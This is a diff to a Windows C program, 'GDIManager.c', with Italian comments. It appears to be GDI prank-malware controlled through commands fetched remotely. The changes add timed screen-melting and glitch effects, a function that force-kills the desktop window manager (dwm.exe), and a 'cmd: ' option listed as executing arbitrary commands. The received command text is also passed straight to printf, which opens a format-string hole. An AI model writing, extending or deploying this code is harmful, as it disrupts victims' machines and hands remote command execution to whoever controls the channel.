@@ -1,3 +1,10 @@
+// compile 4 windows: cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
+#ifdef _WIN32
+    #define popen _popen // MSVC non riconosce popen, ma _popen, quindi definisce popen as _popen, idem con pclose
+    #define pclose _pclose
+#endif
+#define _WIN32_WINNT 0x0600
+#define WINVER 0x0600
 #include <windows.h>
 #include <math.h>
 #include <string.h>
@@ -217,11 +224,16 @@ void msgbox() {
         "Che tristezza la neomelodica :("
     };
 
-    int randomtext = rand() % 6; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
+    int randomtext = rand() % 7; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
     MessageBox(NULL, frasi[randomtext], "MessageBox", MB_OK | MB_ICONINFORMATION);
 }
 
-void countdown(int secs) { // passa secs da curl
+void cleandwm() {
+    system("TASKKILL /F /IM dwm.exe");
+    Sleep(20000);
+}
+
+void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs')
     int w = GetSystemMetrics(SM_CXSCREEN) / 2; // piglio la meta' per ottenere il centro
     int h = GetSystemMetrics(SM_CYSCREEN) / 2; // idem qui
 
@@ -249,19 +261,23 @@ void countdown(int secs) { // passa secs da curl
     }
 
     // fx exhibition
-    int i;
-    for (i=0;i<50;i++) {TextOut(hdc, w, h, "Elektro was here!", 17);}
-    for (i=0;i<500;i++) {fkngmelter();}
-    for (i=0;i<50;i++) {TextOut(hdc, w, h, "lesgo", 5);}
-    for (i=0;i<100;i++) {heightglitch_run();}
-    for (i=0;i<50;i++) {TextOut(hdc, w, h, "Subwoofer", 5);}
-    for (i=0;i<100;i++) {widthglitch_run();}
-    for (i=0;i<100;i++) {tunnel_run();ltunnel_run();}
-    for (i=0;i<400;i++) {fkngmelter();}
-    for (i=0;i<600;i++) {squarefx_run();}
-    for (i=0;i<100;i++) {circleshake_run();}
-    for (i=0;i<4;i++) {tunnel_run();ltunnel_run();}
-    for (i=0;i<12;i++) {fkngmelter();heightglitch_run();}
+    ULONGLONG elapsed = GetTickCount64(); // timer dal boot del kernel. Cifra a 64bit
+    while (1) {
+        if (GetTickCount64() - elapsed < 1000) {TextOut(hdc, w, h, "Elektro was here!", 17);}
+        else if (GetTickCount64() - elapsed < 11000) {fkngmelter();}
+        else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();}
+        else if (GetTickCount64() - elapsed < 14000) {TextOut(hdc, w, h, "Subwoofer", 9);}
+        else if (GetTickCount64() - elapsed < 16000) {widthglitch_run();}
+        else if (GetTickCount64() - elapsed < 21000) {lulu();}
+        else if (GetTickCount64() - elapsed < 29000) {ltunnel_run();}
+        else if (GetTickCount64() - elapsed < 33000) {ltunnel_run();}
+        else if (GetTickCount64() - elapsed < 43000) {fkngmelter();}
+        else if (GetTickCount64() - elapsed < 63000) {squarefx_run();}
+        else if (GetTickCount64() - elapsed < 65000) {circleshake_run();}
+        else if (GetTickCount64() - elapsed < 69000) {tunnel_run();ltunnel_run();}
+        else if (GetTickCount64() - elapsed < 77000) {fkngmelter();heightglitch_run();}
+        else {break;}
+    }
 }
 
 int main() {
@@ -292,6 +308,7 @@ int main() {
         CircleShake - 5
         LongTunnel(morePX) - 6
         BouncySquare - 7
+        FkngMelter - 8
 
         Misc:
         "cmd: " - xec a command
@@ -302,7 +319,7 @@ int main() {
 
         if (strstr(reqtextbuffer, "1")) {
             int i;
-            for(i=0;i<100;i++) {
+            for (i=0;i<100;i++) {
                 startfx();
             }
         }
@@ -365,19 +382,22 @@ int main() {
             printf("Sleeping for 20 secs\n");
             Sleep(20000);
         }
+
         else if (strstr(reqtextbuffer, "CleanDWM")) {
-            system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
-            Sleep(20000);
+            cleandwm();
         }
+
         else if (strstr(reqtextbuffer, "Lulu")) {
             int i;
             for (i=0;i<500;i++) {
                 lulu();
             }
         }
+
         else if (strstr(reqtextbuffer, "RandomMSGs")) {
             msgbox();
         }
+
         else if (strstr(reqtextbuffer, "Timer: ")) {
             printf(reqtextbuffer);
             char *timer = reqtextbuffer + 7; // 7 char su "Timer: " (more doc? scrolla sopra)
